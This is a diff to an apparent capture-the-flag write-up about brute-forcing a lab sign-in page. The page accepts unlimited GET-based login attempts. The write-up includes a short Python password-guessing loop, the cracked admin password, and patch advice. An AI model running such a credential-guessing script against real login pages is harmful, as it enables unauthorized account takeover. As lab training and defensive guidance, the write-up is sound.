@@ -1,16 +1,43 @@
 # BRUTE FORCE ATTACK ON SIGN-IN PAGE
 
-## HOW WE IDENTIFIED THE VULNERABILITY
-Upon examination, we discovered that the login page allowed an unlimited number of login attempts, and the authentication process was handled through a GET request.
+## IDENTIFY THE VULNERABILITY
 
-## HOW THE VULNERABILITY WAS EXPLOITED
-We executed a brute force attack by repeatedly attempting unauthorized logins using a Python script and a list of commonly used passwords.
+Upon examination, we discovered that the login page, accessible at http://192.168.56.2/?page=signin, allowed an unlimited number of login attempts, and the authentication process was handled through a GET request.
 
-## INFORMATION ON THE VULNERABILITY AND ITS RISKS
+## EXPLOIT THE VULNERABILITY
+
+We executed a brute force attack by repeatedly attempting unauthorized logins using a Python script and a list of commonly used passwords. The script utilized the requests library to dispatch multiple GET requests to the login page, each time featuring a distinct password. Then, it checked the response to determine if the login was successful. If the wrong answer image was not present in the response, the login was considered successful.
+
+```python
+def login(username: str, password: str) -> bool:
+    # Build login url
+    url = URL + "&username=" + username + "&password=" + password + "&Login=Login#"
+    # Try to login
+    content = get_request(url)
+    if WRONG_ANSWER_IMG in content.decode():
+        return False
+    # If the wrong answer image is not present, the login was successful
+    return True
+
+def test_common_passwords(username: str) -> None:
+    # Read passwords list from an external file
+    with open(PASSWORDS_FILE_PATH, 'r', encoding='utf-8') as file:
+        for line in file:
+            password = line.strip()
+            result = login(username, password)
+            if (result == True):
+                return
+```
+
+Ultimately, we were able to gain access to the admin account by guessing the password "shadow". We can login with any username. This allowed us to access the flag.
+
+## INFORMATION ON BRUTE FORCE ATTACKS
+
 Brute force is a hacking technique used for guessing the user by trying various possible login credentials. Brute-force involves trying thousands of login credentials repeatedly in a short time span until the attacker succeeds.
 In regards to authentication, when no password policy is in place an attacker can use lists of common username and passwords to brute force a username or password field until successful authentication.
 
-## PATCH
+## PATCH THE VULNERABILITY
+
 To mitigate the risks associated with brute force attacks, consider the following measures:
 
     1. Switch to POST Request: Prefer using a POST request for login instead of a GET request. This ensures that credentials are sent in the HTTP message body rather than the URL.
@@ -41,5 +68,5 @@ To mitigate the risks associated with brute force attacks, consider the followin
 Implementing these security measures collectively strengthens the defense of the sign-in page against brute force attacks.
 
 ## SOURCES
-https://www.getastra.com/blog/cms/prevent-brute-force-attack-in-php/
 
+https://www.getastra.com/blog/cms/prevent-brute-force-attack-in-php/
